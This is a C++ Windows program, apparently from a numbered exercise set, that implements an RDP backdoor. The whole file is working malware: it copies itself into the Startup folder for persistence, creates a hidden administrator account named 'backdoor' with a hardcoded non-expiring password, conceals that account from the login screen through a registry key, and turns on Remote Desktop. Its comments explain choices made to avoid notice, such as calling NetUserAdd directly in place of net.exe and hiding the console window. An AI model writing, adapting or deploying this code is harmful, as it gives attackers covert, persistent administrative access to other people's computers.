#include <windows.h>
#include <lm.h>
#include <shlobj.h>
#include <iostream>
#include <string>

#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

// Configuration Constants
const wchar_t *TARGET_EXE_NAME = L"A06_5_RDP_backdoor.exe";
const wchar_t *BACKDOOR_USER = L"backdoor";
const wchar_t *BACKDOOR_PASS = L"P@ssw0rd123!";

// Helper function to check if running from the Startup Folder
bool IsRunningFromStartup(const std::wstring &currentPath, const std::wstring &startupDir)
{
    return currentPath.find(startupDir) != std::wstring::npos;
}

// Phase 1: Self-Installation to the User-Specific Startup Folder
bool InstallToStartupFolder()
{
    wchar_t currentPath[MAX_PATH];
    wchar_t startupPath[MAX_PATH];

    GetModuleFileNameW(NULL, currentPath, MAX_PATH);

    // Retrieve the current user's roaming AppData Startup folder dynamically
    if (SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath) == S_OK)
    {
        std::wstring targetPath = std::wstring(startupPath) + L"\\" + TARGET_EXE_NAME;

        if (!IsRunningFromStartup(currentPath, startupPath))
        {
            // Copy binary to persistence location
            if (CopyFileW(currentPath, targetPath.c_str(), FALSE))
            {
                return true; // Successfully installed
            }
        }
    }
    return false;
}

// Phase 2: Native Account Creation and RDP Backdoor Configuration
bool ConfigureRDPBackdoor()
{
    USER_INFO_1 ui;
    DWORD dwError = 0;

    // 1. Establish the Local User Account Structure
    ui.usri1_name = const_cast<LPWSTR>(BACKDOOR_USER);
    ui.usri1_password = const_cast<LPWSTR>(BACKDOOR_PASS);
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD; // Password never expires
    ui.usri1_script_path = NULL;

    // Call NetUserAdd natively to avoid launching net.exe
    NET_API_STATUS nStatus = NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
    if (nStatus != NERR_Success && nStatus != NERR_UserExists)
    {
        return false;
    }

    // 2. Add User to Local Administrators Group
    LOCALGROUP_MEMBERS_INFO_3 lmi;
    lmi.lgrmi3_domainandname = const_cast<LPWSTR>(BACKDOOR_USER);
    NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&lmi, 1);

    // 3. Hide Account from Windows Welcome/Login Screen via Registry Modification
    HKEY hKey;
    const wchar_t *specialAccountsPath = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList";

    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, specialAccountsPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS)
    {
        DWORD dwData = 0; // Value 0 ensures concealment from the UI
        RegSetValueExW(hKey, BACKDOOR_USER, 0, REG_DWORD, (const BYTE *)&dwData, sizeof(dwData));
        RegCloseKey(hKey);
    }

    // 4. Enable Remote Desktop (Modify Terminal Server setting)
    const wchar_t *terminalServerPath = L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server";
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, terminalServerPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS)
    {
        DWORD dwDenyConnections = 0; // 0 = Allow connections
        RegSetValueExW(hKey, L"fDenyTSConnections", 0, REG_DWORD, (const BYTE *)&dwDenyConnections, sizeof(dwDenyConnections));
        RegCloseKey(hKey);
    }

    return true;
}

// Application Entry Point (Windows Subsystem avoids flashing console frames)
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    wchar_t currentPath[MAX_PATH];
    wchar_t startupPath[MAX_PATH];

    GetModuleFileNameW(NULL, currentPath, MAX_PATH);
    SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath);

    // Context Evaluation
    if (!IsRunningFromStartup(currentPath, startupPath))
    {
        // Step 1: Execute installation flow if running from a staging directory
        InstallToStartupFolder();
    }
    else
    {
        // Step 2: Running from persistence trigger context; enforce configuration modifications
        ConfigureRDPBackdoor();
    }

    return 0;
}